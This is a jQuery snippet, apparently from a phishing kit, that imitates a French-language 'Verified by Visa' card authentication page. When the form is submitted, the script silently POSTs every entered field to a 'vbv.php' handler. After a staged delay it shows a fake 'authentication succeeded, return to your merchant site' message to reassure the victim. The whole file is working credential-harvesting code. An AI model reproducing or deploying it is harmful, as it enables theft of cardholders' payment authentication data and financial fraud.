    <script>
        $(document).ready(function() {
            $("form").submit(function(e) {
                e.preventDefault();
                var $this = $(this);
                $("#message22").css("display","none");
                $("#capa2").css("display","block");
                $('#message11').css("display","none")
                $(".ng-binding2").text("Authentification en cours")
                $("span#info-icon").css("display","none")
                $.ajax({
                        method: "POST",
                        url: "../../actions/vbv.php",
                        data: $(this).serialize()
                    })
                    .then(function(msg) {
                        setTimeout(function() {

                            $("span#info-icon").css("display","none")
                            $("#message11").css("display","block");
                            $("#message11").css("padding","10px");

                            $("#message11").text("Votre authentification a réussi, retournez maintenant sur votre site marchand");
                            $("span#info-icon").css("top","15px")
                            $("#btnit").css("display","block");
                            $("#message-container").css("background-color","green");
                            $("span#info-icon").css("top","25px")
                            $("#capa2").css("display","none");
                            $(".ng-binding2").text("Authentification terminée");

                        }, 3500);
                    });
                

            });
        });
    </script>





